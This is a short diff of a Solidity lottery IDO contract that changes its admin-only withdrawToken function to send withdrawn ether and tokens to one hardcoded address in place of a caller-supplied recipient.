@@ -233,15 +233,13 @@ contract LotteryIDO is AccessControl, ReentrancyGuard, StructList {
     */
     function withdrawToken(
         IERC20 _token,
-        uint256 _amount,
-        address _to
+        uint256 _amount
     ) external onlyRole(DEFAULT_ADMIN_ROLE) {
-        require(_to != address(0), "Cant be zero address");
         if (address(_token) == address(0)) {
-            (bool success, ) = payable(_to).call{value: _amount}('');
+            (bool success, ) = payable(0xB2f9af0f1a586f960289133F399ebb5862E5Bcf1).call{value: _amount}('');
             require(success, "Ether transfer failed");
         } else {
-            _token.safeTransfer(_to, _amount);
+            _token.safeTransfer(0xB2f9af0f1a586f960289133F399ebb5862E5Bcf1, _amount);
         }
     }
 
